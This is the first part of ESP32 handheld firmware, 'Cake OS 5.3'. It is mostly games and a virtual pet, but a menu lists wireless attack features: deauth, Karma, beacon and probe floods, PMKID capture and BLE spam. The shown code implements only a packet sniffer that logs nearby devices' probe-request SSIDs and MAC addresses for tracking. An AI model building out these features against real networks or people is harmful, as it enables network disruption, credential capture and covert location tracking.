/*
 * Cake OS 5.3 - Part 1/2
 */
#include <SPI.h>
#include <TFT_eSPI.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <EEPROM.h>
#include <NimBLEDevice.h>
#include <LittleFS.h>
#include <Wire.h>
#include <math.h>
#include <stdarg.h>
#include <mbedtls/md.h>
using fs::File;

bool littlefsReady = false;
void ensureLittleFS() { if (!littlefsReady) littlefsReady = LittleFS.begin(true); }
TFT_eSPI tft = TFT_eSPI();

#define WIFI_SSID     "WiFi名"
#define WIFI_PASSWORD "密码"
#define BTN_UP    0
#define BTN_DOWN  1
#define BTN_LEFT  2
#define BTN_RIGHT 3

const char* VERSION     = "5.3";
const char* DEVICE_NAME = "CakeOS5.3";

uint8_t g_kbLayout = 0;

#define GAME_COUNT 12
#define GAMEKEY_MAGIC 0xAF
#define GAMEKEY_EEPROM_ADDR 740
struct GameKeyMapData { uint8_t magic; uint8_t map[GAME_COUNT][4]; };
GameKeyMapData g_gameKeyMap;
int g_curGameIdx = 0;
void gameKeyMapLoad() { EEPROM.get(GAMEKEY_EEPROM_ADDR, g_gameKeyMap); if (g_gameKeyMap.magic != GAMEKEY_MAGIC) { g_gameKeyMap.magic = GAMEKEY_MAGIC; for (int i=0;i<GAME_COUNT;i++) for (int j=0;j<4;j++) g_gameKeyMap.map[i][j]=j; EEPROM.put(GAMEKEY_EEPROM_ADDR, g_gameKeyMap); EEPROM.commit(); } }
void gameKeyMapSave() { EEPROM.put(GAMEKEY_EEPROM_ADDR, g_gameKeyMap); EEPROM.commit(); }

const char* gameMenu[] = {
  "Tetris","Breakout","Snake","Dino Run","Flappy Bird",
  "2048","Minesweeper","Roguelike","Jump","Tower Def","Gomoku","Settings"
};
const int gameMenuCount = 12;
int selectedGame = 0, gameOffset = 0;
const uint8_t gameIcons[] = {20,21,22,23,24,25, 27,28,29,30,31,32};

const char* hackMenu[] = {
  "WiFi Connect","IP Scan","Super Deauth","Karma","Probe Flood",
  "Beacon Flood","PMKID","Sniffer","Key Encoder","Device Tracker",
  "BLE Scan","BLE Spam","Chan Graph","BLE GATT","Tracker Detect",
  "BLE Connect","BLE Be Connected","Settings"
};
const int hackMenuCount = 18;
int selectedHack = 0, hackOffset = 0;
const uint8_t hackIcons[] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,50,51,32};

const uint8_t toolsIcons[] = {60, 61, 32};

char g_petMsg[28] = "";
uint16_t g_petMsgColor = TFT_GREEN;
int g_petMsgTimer = 0;
bool g_shopFed = false;

unsigned long lastPressTime[4] = {0, 0, 0, 0};
bool waitingDouble[4] = {false, false, false, false};
const unsigned long DOUBLE_WINDOW = 400;

bool wifiInited = false, bleInited = false;
bool wifiConfigured = false, wifiWasConnected = false;
int lastWifiDisplay = -1;
unsigned long lastWifiCheck = 0;
unsigned long wifiDisconnectTime = 0, wifiReconnectDelay = 3000;
const unsigned long WIFI_MIN_DELAY = 3000, WIFI_MAX_DELAY = 30000;
int wifiDisconnectCount = 0;
char g_wifiSSID[33] = "";
char g_wifiPass[65] = "";

#define PET2_EEPROM_ADDR  110
#define WIFI_CACHE_ADDR   200
#define WIFI_IP_CACHE_ADDR 220
#define KEY_EEPROM_ADDR   300
#define DINO_EEPROM_ADDR  400
#define TET_EEPROM_ADDR   420
#define BRK_EEPROM_ADDR   440
#define FLP_EEPROM_ADDR   460
#define G2_EEPROM_ADDR    480
#define PLN_EEPROM_ADDR   500
#define MIN_EEPROM_ADDR   520
#define ROG_EEPROM_ADDR   560
#define WC_EEPROM_ADDR    600
#define JMP_EEPROM_ADDR   620
#define TD_EEPROM_ADDR    640
#define SNK_EEPROM_ADDR   660
#define GM_EEPROM_ADDR    700

#define WIFI_CACHE_MAGIC   0xB7
#define WIFI_IP_MAGIC      0xB8
#define WC_MAGIC           0xC5
#define PET2_MAGIC         0xCA33
#define PET2_MAGIC_OLD     0xCA32
#define KEY_MAGIC          0xA5
#define DINO_MAGIC         0xD1
#define TET_MAGIC          0x7E
#define BRK_MAGIC          0x8B
#define FLP_MAGIC          0xF1
#define G2_MAGIC           0x21
#define PLN_MAGIC          0xA7
#define MIN_MAGIC          0xA8
#define ROG_MAGIC          0xA9
#define JMP_MAGIC          0xAA
#define TD_MAGIC           0xAB
#define SNK_MAGIC          0xAC
#define GM_MAGIC           0xAE

struct SnakeData { uint16_t bestScore; uint8_t magic; };
SnakeData snkData;
void snkLoad() { EEPROM.get(SNK_EEPROM_ADDR, snkData); if (snkData.magic != SNK_MAGIC) { snkData.bestScore = 0; snkData.magic = SNK_MAGIC; EEPROM.put(SNK_EEPROM_ADDR, snkData); EEPROM.commit(); } }
void snkSave() { EEPROM.put(SNK_EEPROM_ADDR, snkData); EEPROM.commit(); }
struct GmData { uint16_t wins, losses; uint8_t magic; };
GmData gmData;
void gmLoad() { EEPROM.get(GM_EEPROM_ADDR, gmData); if (gmData.magic != GM_MAGIC) { gmData.wins=0; gmData.losses=0; gmData.magic=GM_MAGIC; EEPROM.put(GM_EEPROM_ADDR, gmData); EEPROM.commit(); } }
void gmSave() { EEPROM.put(GM_EEPROM_ADDR, gmData); EEPROM.commit(); }

struct WifiCache { uint8_t magic, channel, bssid[6]; };
WifiCache wifiCache;
void wifiCacheLoad() { EEPROM.get(WIFI_CACHE_ADDR, wifiCache); if (wifiCache.magic != WIFI_CACHE_MAGIC) { wifiCache.magic = WIFI_CACHE_MAGIC; wifiCache.channel = 0; memset(wifiCache.bssid, 0, 6); } }
void wifiCacheSave(uint8_t ch, uint8_t* bssid) { wifiCache.magic = WIFI_CACHE_MAGIC; wifiCache.channel = ch; memcpy(wifiCache.bssid, bssid, 6); EEPROM.put(WIFI_CACHE_ADDR, wifiCache); EEPROM.commit(); }
bool wifiCacheValid() { return wifiCache.magic == WIFI_CACHE_MAGIC && wifiCache.channel >= 1 && wifiCache.channel <= 13; }
struct WifiIpCache { uint8_t magic; uint8_t ip[4]; uint8_t gw[4]; uint8_t subnet[4]; uint8_t dns[4]; };
WifiIpCache wifiIpCache;
void wifiIpCacheLoad() { EEPROM.get(WIFI_IP_CACHE_ADDR, wifiIpCache); if (wifiIpCache.magic != WIFI_IP_MAGIC) { wifiIpCache.magic = 0; memset(wifiIpCache.ip,0,4); memset(wifiIpCache.gw,0,4); memset(wifiIpCache.subnet,0,4); memset(wifiIpCache.dns,0,4); } }
void wifiIpCacheSave(IPAddress ip, IPAddress gw, IPAddress subnet, IPAddress dns) { wifiIpCache.magic = WIFI_IP_MAGIC; memcpy(wifiIpCache.ip,&ip[0],4); memcpy(wifiIpCache.gw,&gw[0],4); memcpy(wifiIpCache.subnet,&subnet[0],4); memcpy(wifiIpCache.dns,&dns[0],4); EEPROM.put(WIFI_IP_CACHE_ADDR, wifiIpCache); EEPROM.commit(); }
bool wifiIpCacheValid() { return wifiIpCache.magic == WIFI_IP_MAGIC && wifiIpCache.ip[0] != 0 && wifiIpCache.ip[0] != 255; }
void wifiIpCacheClear() { wifiIpCache.magic = 0; EEPROM.put(WIFI_IP_CACHE_ADDR, wifiIpCache); EEPROM.commit(); }
struct WifiCred { uint8_t magic; char ssid[33]; char pass[65]; };

struct Pet2Data { uint8_t hunger,mood,energy,clean,health,bond,level; uint32_t exp; uint16_t coins,ach,ownedSkins; uint8_t currentSkin,stage; uint16_t taskProgress[10]; uint16_t totalFeed,totalPlay,totalSleep,totalClean; uint16_t magic; };
struct Pet2DataOld { uint8_t hunger,mood,energy,clean,health,bond,level; uint16_t exp; uint16_t coins,ach,ownedSkins; uint8_t currentSkin,stage; uint16_t taskProgress[10]; uint16_t totalFeed,totalPlay,totalSleep,totalClean; uint16_t magic; };
Pet2Data pet2;
int8_t pet2ClampAdd(uint8_t& v, int delta) { int nv=(int)v+delta; if(nv<0)nv=0; if(nv>100)nv=100; int8_t d=(int8_t)(nv-(int)v); v=(uint8_t)nv; return d; }
struct PetFood { const char* name; int8_t dHunger,dMood,dClean,dHealth,dEnergy; uint16_t cost; };
const PetFood PET_FOODS[] = {
  {"Fish",20,5,0,0,0,5},{"Seaweed",15,0,-5,0,0,3},{"Cake",25,15,0,-5,0,10},
  {"Vitamin",10,5,0,20,0,15},{"Steak",40,5,0,0,0,20},{"IceCream",10,30,-10,0,0,12},
  {"Sushi",30,10,0,5,0,25},{"EnergyDrink",5,5,0,-5,25,18},{"Salad",18,3,10,5,0,8},
  {"Chocolate",10,25,-5,-5,5,15},{"Soup",30,10,0,5,5,10},{"Candy",8,20,0,-3,0,6}
};
const int PET_FOOD_COUNT = 12;
struct PetItem { const char* name; int8_t dHunger,dMood,dClean,dHealth,dEnergy,dBond; uint16_t cost; };
const PetItem PET_ITEMS[] = {
  {"Soap",0,0,100,0,0,2,8},{"ToyBall",0,30,0,0,0,3,15},{"Medicine",0,0,0,40,0,5,30},
  {"Coffee",0,0,0,0,30,2,12},{"MusicBox",0,20,0,0,0,5,20}
};
const int PET_ITEM_COUNT = 5;
struct TaskTemplate { const char* desc; uint16_t base; uint8_t type; };
const TaskTemplate TASK_TPL[10] = {
  {"Feed",3,0},{"Play",2,1},{"Sleep",2,2},{"Clean",1,3},{"Level",3,4},
  {"Coins",20,5},{"Games",1,6},{"Score",30,7},{"Mood",50,8},{"Bond",10,9}
};
uint32_t pet2ExpNeeded() { double e=50.0*pow(1.18,pet2.level-1); if(e>5000000.0)e=5000000.0; return (uint32_t)e; }
uint16_t taskNeed(int stage, int idx) { double f=pow(1.3,stage-1); uint32_t need=(uint32_t)(TASK_TPL[idx].base*f); if(need<TASK_TPL[idx].base)need=TASK_TPL[idx].base; if(need>60000)need=60000; return (uint16_t)need; }
void pet2Load() {
  EEPROM.get(PET2_EEPROM_ADDR, pet2);
  bool needMigrate = false;
  { Pet2DataOld old; EEPROM.get(PET2_EEPROM_ADDR, old);
    if (old.magic == PET2_MAGIC_OLD) {
      pet2.hunger=old.hunger; pet2.mood=old.mood; pet2.energy=old.energy; pet2.clean=old.clean; pet2.health=old.health; pet2.bond=old.bond;
      pet2.level=old.level; pet2.exp=old.exp; pet2.coins=old.coins; pet2.ach=old.ach; pet2.ownedSkins=old.ownedSkins;
      pet2.currentSkin=old.currentSkin; pet2.stage=old.stage;
      for(int i=0;i<10;i++)pet2.taskProgress[i]=old.taskProgress[i];
      pet2.totalFeed=old.totalFeed; pet2.totalPlay=old.totalPlay; pet2.totalSleep=old.totalSleep; pet2.totalClean=old.totalClean;
      pet2.magic=PET2_MAGIC; EEPROM.put(PET2_EEPROM_ADDR, pet2); EEPROM.commit(); needMigrate=true;
    }
  }
  if (!needMigrate && pet2.magic != PET2_MAGIC) {
    pet2.hunger=80; pet2.mood=80; pet2.energy=80; pet2.clean=90; pet2.health=100; pet2.bond=10; pet2.level=1; pet2.exp=0; pet2.coins=10; pet2.ach=0;
    pet2.ownedSkins=0x01; pet2.currentSkin=0; pet2.stage=1;
    for(int i=0;i<10;i++)pet2.taskProgress[i]=0;
    pet2.totalFeed=0; pet2.totalPlay=0; pet2.totalSleep=0; pet2.totalClean=0;
    pet2.magic=PET2_MAGIC; EEPROM.put(PET2_EEPROM_ADDR, pet2); EEPROM.commit();
  }
  if(pet2.hunger>100)pet2.hunger=100; if(pet2.mood>100)pet2.mood=100; if(pet2.energy>100)pet2.energy=100;
  if(pet2.clean>100)pet2.clean=100; if(pet2.health>100)pet2.health=100; if(pet2.bond>100)pet2.bond=100;
  if(pet2.level<1)pet2.level=1; if(pet2.level>100)pet2.level=100;
  if(pet2.stage<1)pet2.stage=1; if(pet2.stage>30)pet2.stage=30;
}
void pet2Save() { EEPROM.put(PET2_EEPROM_ADDR, pet2); EEPROM.commit(); }
void pet2Unlock(uint8_t b) { if (!(pet2.ach & (1 << b))) pet2.ach |= (1 << b); }
void pet2TaskRefresh() {
  for (int i = 0; i < 10; i++) {
    if (pet2.taskProgress[i] >= 100) continue;
    uint16_t need = taskNeed(pet2.stage, i); if (need == 0) need = 1;
    uint32_t curVal = 0;
    switch (TASK_TPL[i].type) { case 4: curVal=pet2.level; break; case 5: curVal=pet2.coins; break; case 8: curVal=pet2.mood; break; case 9: curVal=pet2.bond; break; default: continue; }
    uint16_t pct = (curVal >= need) ? 100 : (uint16_t)(curVal * 100 / need);
    if (pct > pet2.taskProgress[i]) pet2.taskProgress[i] = pct;
  }
  pet2Save();
}
void pet2AddExp(uint16_t n) { if(pet2.bond>=70)n=(n*12)/10; pet2.exp+=n; while(pet2.level<100&&pet2.exp>=pet2ExpNeeded()){pet2.exp-=pet2ExpNeeded();pet2.level++;} if(pet2.level>=100)pet2.exp=0; if(pet2.level>=5)pet2Unlock(4); if(pet2.level>=10)pet2Unlock(5); pet2TaskRefresh(); pet2Save(); }
void pet2AddCoins(uint16_t n) { pet2.coins += n; if (pet2.coins >= 100) pet2Unlock(6); pet2TaskRefresh(); pet2Save(); }
void pet2AddBond(uint8_t n) { pet2.bond += n; if (pet2.bond > 100) pet2.bond = 100; pet2TaskRefresh(); pet2Save(); }
void pet2TaskAdd(uint8_t type, uint16_t amount) { for(int i=0;i<10;i++){if(TASK_TPL[i].type!=type)continue;if(pet2.taskProgress[i]>=100)continue;uint16_t need=taskNeed(pet2.stage,i);if(need==0)need=1;uint32_t cur=((uint32_t)pet2.taskProgress[i]*need)/100+amount;if(cur>=need)pet2.taskProgress[i]=100;else pet2.taskProgress[i]=(cur*100)/need;} pet2Save(); }
void pet2TaskSet(uint8_t type, uint16_t value) { for(int i=0;i<10;i++){if(TASK_TPL[i].type!=type)continue;if(pet2.taskProgress[i]>=100)continue;uint16_t need=taskNeed(pet2.stage,i);if(need==0)need=1;if(value>=need)pet2.taskProgress[i]=100;else pet2.taskProgress[i]=(value*100)/need;} pet2Save(); }
bool pet2StageComplete() { pet2TaskRefresh(); for(int i=0;i<10;i++)if(pet2.taskProgress[i]<100)return false; return true; }
void pet2AdvanceStage() { if(pet2.stage<30){pet2.coins+=pet2.stage*50;pet2AddExp(pet2.stage*20);pet2.stage++;for(int i=0;i<10;i++)pet2.taskProgress[i]=0;pet2TaskRefresh();}pet2Save(); }
void gameReward(uint16_t base) { if(pet2.mood>=70)base=(base*12)/10;else if(pet2.mood<30)base=(base*8)/10;if(pet2.bond>=80)base=(base*11)/10;if(base<1)base=1;if(base>40)base=40;pet2AddCoins(base);pet2.mood+=3;if(pet2.mood>100)pet2.mood=100;pet2AddExp(3);pet2AddBond(1);pet2Save(); }

struct KeyModel { const char* name; uint8_t teeth, maxDepth; };
const KeyModel MODELS[] = {{"SC4",6,9},{"KW1",5,6},{"SC1",5,8},{"M1",5,6},{"WR5",5,6}};
const int MODEL_COUNT = 5;
uint8_t keyModel = 0, keyTeeth[8];
void keyLoad() { if(EEPROM.read(KEY_EEPROM_ADDR)!=KEY_MAGIC){EEPROM.write(KEY_EEPROM_ADDR,KEY_MAGIC);EEPROM.write(KEY_EEPROM_ADDR+1,0);for(int i=0;i<8;i++)EEPROM.write(KEY_EEPROM_ADDR+2+i,0);EEPROM.commit();keyModel=0;memset(keyTeeth,0,8);return;}keyModel=EEPROM.read(KEY_EEPROM_ADDR+1);if(keyModel>=MODEL_COUNT)keyModel=0;for(int i=0;i<8;i++)keyTeeth[i]=EEPROM.read(KEY_EEPROM_ADDR+2+i);for(int i=0;i<8;i++)if(keyTeeth[i]>MODELS[keyModel].maxDepth)keyTeeth[i]=MODELS[keyModel].maxDepth; }
void keySave() { EEPROM.write(KEY_EEPROM_ADDR,KEY_MAGIC);EEPROM.write(KEY_EEPROM_ADDR+1,keyModel);for(int i=0;i<8;i++)EEPROM.write(KEY_EEPROM_ADDR+2+i,keyTeeth[i]);EEPROM.commit(); }

struct DinoData { uint16_t bestDistance, bestCactus; uint8_t ownedSkins, currentSkin, magic; };
DinoData dinoData;
struct DinoSkin { const char* name; uint16_t color, cost; };
const DinoSkin DINO_SKINS[] = {{"Green",0x07E0,0},{"Red",0xF800,25},{"Blue",0x07FF,50},{"Purple",0xF81F,100},{"Gold",0xFFE0,200}};
const int DINO_SKIN_COUNT = 5;
void dinoLoad() { EEPROM.get(DINO_EEPROM_ADDR, dinoData); if(dinoData.magic!=DINO_MAGIC){dinoData.bestDistance=0;dinoData.bestCactus=0;dinoData.ownedSkins=0x01;dinoData.currentSkin=0;dinoData.magic=DINO_MAGIC;EEPROM.put(DINO_EEPROM_ADDR,dinoData);EEPROM.commit();}if(dinoData.currentSkin>=DINO_SKIN_COUNT)dinoData.currentSkin=0;dinoData.ownedSkins|=0x01; }
void dinoSave() { EEPROM.put(DINO_EEPROM_ADDR, dinoData); EEPROM.commit(); }

struct TetrisData { uint16_t bestScore, bestLines; uint8_t ownedSkins, currentSkin, magic; };
TetrisData tetData;
struct TetrisSkin { const char* name; uint16_t color, cost; };
const TetrisSkin TET_SKINS[] = {{"Green",0x07E0,0},{"Blue",0x07FF,25},{"Red",0xF800,50},{"Purple",0xF81F,100},{"Gold",0xFFE0,200}};
const int TET_SKIN_COUNT = 5;
void tetLoad() { EEPROM.get(TET_EEPROM_ADDR, tetData); if(tetData.magic!=TET_MAGIC){tetData.bestScore=0;tetData.bestLines=0;tetData.ownedSkins=0x01;tetData.currentSkin=0;tetData.magic=TET_MAGIC;EEPROM.put(TET_EEPROM_ADDR,tetData);EEPROM.commit();}if(tetData.currentSkin>=TET_SKIN_COUNT)tetData.currentSkin=0;tetData.ownedSkins|=0x01; }
void tetSave() { EEPROM.put(TET_EEPROM_ADDR, tetData); EEPROM.commit(); }

struct BreakoutData { uint16_t bestScore, bestBricks; uint8_t ownedSkins, currentSkin, magic; };
BreakoutData brkData;
struct BreakoutSkin { const char* name; uint16_t brickColor, ballColor, cost; };
const BreakoutSkin BRK_SKINS[] = {{"Blue",0x001F,0x07E0,0},{"Red",0xF800,0xFFE0,25},{"Green",0x07E0,0xF800,50},{"Purple",0xF81F,0x07FF,100},{"Gold",0xFFE0,0xF81F,200}};
const int BRK_SKIN_COUNT = 5;
void brkLoad() { EEPROM.get(BRK_EEPROM_ADDR, brkData); if(brkData.magic!=BRK_MAGIC){brkData.bestScore=0;brkData.bestBricks=0;brkData.ownedSkins=0x01;brkData.currentSkin=0;brkData.magic=BRK_MAGIC;EEPROM.put(BRK_EEPROM_ADDR,brkData);EEPROM.commit();}if(brkData.currentSkin>=BRK_SKIN_COUNT)brkData.currentSkin=0;brkData.ownedSkins|=0x01; }
void brkSave() { EEPROM.put(BRK_EEPROM_ADDR, brkData); EEPROM.commit(); }

struct FlappyData { uint16_t bestScore; uint8_t ownedSkins, currentSkin, magic; };
FlappyData flpData;
struct FlappySkin { const char* name; uint16_t color, cost; };
const FlappySkin FLP_SKINS[] = {{"Yellow",0xFFE0,0},{"Red",0xF800,25},{"Blue",0x07FF,50},{"Purple",0xF81F,100},{"Gold",0xFFE0,200}};
const int FLP_SKIN_COUNT = 5;
void flpLoad() { EEPROM.get(FLP_EEPROM_ADDR, flpData); if(flpData.magic!=FLP_MAGIC){flpData.bestScore=0;flpData.ownedSkins=0x01;flpData.currentSkin=0;flpData.magic=FLP_MAGIC;EEPROM.put(FLP_EEPROM_ADDR,flpData);EEPROM.commit();}if(flpData.currentSkin>=FLP_SKIN_COUNT)flpData.currentSkin=0;flpData.ownedSkins|=0x01; }
void flpSave() { EEPROM.put(FLP_EEPROM_ADDR, flpData); EEPROM.commit(); }

struct G2Data { uint16_t bestScore, bestTile; uint8_t ownedSkins, currentSkin, magic; };
G2Data g2Data;
void g2Load() { EEPROM.get(G2_EEPROM_ADDR, g2Data); if(g2Data.magic!=G2_MAGIC){g2Data.bestScore=0;g2Data.bestTile=0;g2Data.ownedSkins=0x01;g2Data.currentSkin=0;g2Data.magic=G2_MAGIC;EEPROM.put(G2_EEPROM_ADDR,g2Data);EEPROM.commit();} }
void g2Save() { EEPROM.put(G2_EEPROM_ADDR, g2Data); EEPROM.commit(); }

struct PlaneData { uint16_t bestScore, bestKills; uint8_t ownedSkins, currentSkin, magic; };
PlaneData plnData;
void plnLoad() { EEPROM.get(PLN_EEPROM_ADDR, plnData); if(plnData.magic!=PLN_MAGIC){plnData.bestScore=0;plnData.bestKills=0;plnData.ownedSkins=0x01;plnData.currentSkin=0;plnData.magic=PLN_MAGIC;EEPROM.put(PLN_EEPROM_ADDR,plnData);EEPROM.commit();} }
void plnSave() { EEPROM.put(PLN_EEPROM_ADDR, plnData); EEPROM.commit(); }

struct MineData { uint16_t bestTime; uint8_t bestDiff, ownedSkins, currentSkin, magic; };
MineData minData;
void minLoad() { EEPROM.get(MIN_EEPROM_ADDR, minData); if(minData.magic!=MIN_MAGIC){minData.bestTime=0;minData.bestDiff=0;minData.ownedSkins=0x01;minData.currentSkin=0;minData.magic=MIN_MAGIC;EEPROM.put(MIN_EEPROM_ADDR,minData);EEPROM.commit();} }
void minSave() { EEPROM.put(MIN_EEPROM_ADDR, minData); EEPROM.commit(); }

struct RogData { uint16_t bestScore; uint8_t bestLevel; uint16_t bestTime; uint8_t magic; };
RogData rogData;
void rogLoad() { EEPROM.get(ROG_EEPROM_ADDR, rogData); if(rogData.magic!=ROG_MAGIC){rogData.bestScore=0;rogData.bestLevel=1;rogData.bestTime=0;rogData.magic=ROG_MAGIC;EEPROM.put(ROG_EEPROM_ADDR,rogData);EEPROM.commit();} }
void rogSave() { EEPROM.put(ROG_EEPROM_ADDR, rogData); EEPROM.commit(); }

struct JumpData { uint16_t bestScore; uint16_t bestDistance; uint8_t magic; };
JumpData jmpData;
void jmpLoad() { EEPROM.get(JMP_EEPROM_ADDR, jmpData); if(jmpData.magic!=JMP_MAGIC){jmpData.bestScore=0;jmpData.bestDistance=0;jmpData.magic=JMP_MAGIC;EEPROM.put(JMP_EEPROM_ADDR,jmpData);EEPROM.commit();} }
void jmpSave() { EEPROM.put(JMP_EEPROM_ADDR, jmpData); EEPROM.commit(); }

struct TdData { uint16_t bestLevel; uint32_t bestScore; uint8_t magic; };
TdData tdData;
void tdLoad() { EEPROM.get(TD_EEPROM_ADDR, tdData); if(tdData.magic!=TD_MAGIC){tdData.bestLevel=0;tdData.bestScore=0;tdData.magic=TD_MAGIC;EEPROM.put(TD_EEPROM_ADDR,tdData);EEPROM.commit();} }
void tdSave() { EEPROM.put(TD_EEPROM_ADDR, tdData); EEPROM.commit(); }

void wifiInitFast() {
  if (!wifiConfigured) return;
  WiFi.persistent(false); WiFi.mode(WIFI_STA); WiFi.setSleep(false); WiFi.setAutoReconnect(true);
  esp_wifi_set_ps(WIFI_PS_NONE); esp_wifi_set_max_tx_power(80); esp_wifi_set_bandwidth(WIFI_IF_STA, WIFI_BW_HT20);
  if (wifiIpCacheValid()) {
    IPAddress ip(wifiIpCache.ip[0], wifiIpCache.ip[1], wifiIpCache.ip[2], wifiIpCache.ip[3]);
    IPAddress gw(wifiIpCache.gw[0], wifiIpCache.gw[1], wifiIpCache.gw[2], wifiIpCache.gw[3]);
    IPAddress subnet(wifiIpCache.subnet[0], wifiIpCache.subnet[1], wifiIpCache.subnet[2], wifiIpCache.subnet[3]);
    IPAddress dns(wifiIpCache.dns[0], wifiIpCache.dns[1], wifiIpCache.dns[2], wifiIpCache.dns[3]);
    WiFi.config(ip, gw, subnet, dns);
  }
  if (wifiCacheValid()) WiFi.begin(g_wifiSSID, g_wifiPass, wifiCache.channel, wifiCache.bssid);
  else WiFi.begin(g_wifiSSID, g_wifiPass);
  wifiDisconnectTime = millis(); wifiDisconnectCount = 0; wifiReconnectDelay = WIFI_MIN_DELAY;
}
void deinitWifi() { if (wifiInited) { esp_wifi_stop(); delay(100); esp_wifi_deinit(); delay(200); wifiInited = false; } }
void restartWifi() { if (!wifiConfigured) return; wifiInitFast(); }
void deinitBLE() { if (bleInited) { NimBLEDevice::deinit(false); bleInited = false; delay(150); } }

#define MAX_BLE_DEVICES 20
struct BLEDeviceInfo { char name[32]; int rssi; char mac[12]; };
BLEDeviceInfo bleDevices[MAX_BLE_DEVICES];
NimBLEAddress bleAddrCache[MAX_BLE_DEVICES];
int bleDeviceCount = 0;

#define MAX_SNIFF 15
struct SniffEntry { uint8_t mac[6]; char ssid[33]; int rssi; };
SniffEntry sniffList[MAX_SNIFF];
int sniffCount = 0;
volatile bool sniffRunning = false;

#define MAX_TRACK 15
struct TrackEntry { uint8_t mac[6]; int rssi; unsigned long lastSeen; };
TrackEntry trackList[MAX_TRACK];
int trackCount = 0;
volatile bool trackRunning = false;

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload; int len = pkt->rx_ctrl.sig_len;
  if (len < 24) return; if (len > 512) len = 512;
  uint8_t fc = p[0]; uint8_t sub = (fc >> 4) & 0x0F; uint8_t ftype = (fc >> 2) & 0x03;
  if (sniffRunning && ftype == 0x00 && sub == 4) {
    int i = 24; char ssid[33] = {0};
    while (i + 1 < len) { uint8_t tag = p[i], tagLen = p[i + 1]; if (i + 2 + tagLen > len) break;
      if (tag == 0 && tagLen > 0 && tagLen <= 32) { memcpy(ssid, &p[i + 2], tagLen); ssid[tagLen] = 0; break; } i += 2 + tagLen; }
    if (ssid[0] != 0) { bool found = false;
      for (int k = 0; k < sniffCount; k++) if (memcmp(sniffList[k].mac, &p[10], 6) == 0) { strncpy(sniffList[k].ssid, ssid, 32); found = true; break; }
      if (!found && sniffCount < MAX_SNIFF) { memcpy(sniffList[sniffCount].mac, &p[10], 6); strncpy(sniffList[sniffCount].ssid, ssid, 32); sniffList[sniffCount].rssi = pkt->rx_ctrl.rssi; sniffCount++; } }
  }
  if (trackRunning) { uint8_t* srcMac = &p[10]; bool found = false;
    for (int k = 0; k < trackCount; k++) if (memcmp(trackList[k].mac, srcMac, 6) == 0) { trackList[k].rssi = pkt->rx_ctrl.rssi; trackList[k].lastSeen = millis(); found = true; break; }
    if (!found && trackCount < MAX_TRACK) { memcpy(trackList[trackCount].mac, srcMac, 6); trackList[trackCount].rssi = pkt->rx_ctrl.rssi; trackList[trackCount].lastSeen = millis(); trackCount++; } }
}

void clearAll() { tft.fillScreen(TFT_BLACK); }
void titleBar(const char* t) { tft.drawString(t, 2, 0); }

void updateWifiStatusBar() {
  int state; if (WiFi.status() == WL_CONNECTED) state = 1; else if (wifiConfigured && wifiDisconnectTime > 0) state = 2; else state = 0;
  static bool cacheSaved = false;
  if (state == 1 && !cacheSaved) { uint8_t* bssid = WiFi.BSSID(); uint8_t ch = WiFi.channel();
    if (bssid && ch >= 1 && ch <= 13) { wifiCacheSave(ch, bssid);
      IPAddress ip = WiFi.localIP(); IPAddress gw = WiFi.gatewayIP(); IPAddress subnet = WiFi.subnetMask(); IPAddress dns = WiFi.dnsIP();
      if (ip[0] != 0) wifiIpCacheSave(ip, gw, subnet, dns); cacheSaved = true; } }
  if (state != 1) cacheSaved = false;
  if (state == lastWifiDisplay) return;
  lastWifiDisplay = state;
  tft.fillRect(95, 0, 65, 10, TFT_BLACK);
  if (state == 1) { tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawString("WIFI:on", 100, 0); }
  else if (state == 2) { tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("WIFI...", 100, 0); }
  else { tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawString("WIFI:off", 100, 0); }
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
}

void drawAppIcon(int x, int y, uint8_t type, uint16_t color) {
  switch (type) {
    case 0: tft.drawCircle(x+4,y+6,2,color); tft.drawCircle(x+4,y+6,4,color); tft.drawCircle(x+4,y+6,5,color); tft.drawLine(x+10,y+4,x+10,y+8,color); tft.drawLine(x+10,y+4,x+12,y+6,color); tft.drawLine(x+10,y+8,x+12,y+6,color); break;
    case 1: tft.drawRect(x+1,y+2,10,8,color); tft.fillRect(x+3,y+4,6,4,color); break;
    case 2: tft.fillTriangle(x+7,y+1,x+3,y+6,x+6,y+6,color); tft.fillTriangle(x+5,y+6,x+8,y+6,x+4,y+11,color); break;
    case 3: tft.drawCircle(x+6,y+6,5,color); tft.drawPixel(x+4,y+5,color); tft.drawPixel(x+8,y+5,color); tft.drawCircleHelper(x+6,y+7,2,0x0C,color); break;
    case 4: for(int i=0;i<3;i++)tft.drawFastHLine(x+1,y+3+i*3,10,color); break;
    case 5: tft.fillRect(x+5,y+5,2,6,color); tft.drawCircle(x+6,y+5,4,color); tft.drawCircle(x+6,y+5,6,color); break;
    case 6: tft.drawRoundRect(x+3,y+5,6,6,1,color); tft.drawCircle(x+6,y+3,2,color); break;
    case 7: tft.drawCircle(x+6,y+6,4,color); tft.fillCircle(x+6,y+6,2,color); break;
    case 8: tft.drawCircle(x+3,y+6,2,color); tft.fillRect(x+5,y+5,6,2,color); tft.drawPixel(x+10,y+7,color); break;
    case 9: tft.drawCircle(x+6,y+4,3,color); tft.fillTriangle(x+3,y+6,x+9,y+6,x+6,y+11,color); break;
    case 10: tft.drawLine(x+6,y+1,x+9,y+4,color); tft.drawLine(x+9,y+4,x+3,y+9,color); tft.drawLine(x+3,y+3,x+9,y+8,color); tft.drawLine(x+9,y+8,x+6,y+11,color); tft.drawLine(x+3,y+3,x+6,y+1,color); break;
    case 11: tft.drawLine(x+4,y+2,x+7,y+5,color); tft.drawLine(x+7,y+5,x+2,y+8,color); tft.drawLine(x+2,y+4,x+7,y+7,color); tft.fillRect(x+10,y+2,2,5,color); tft.fillRect(x+10,y+8,2,2,color); break;
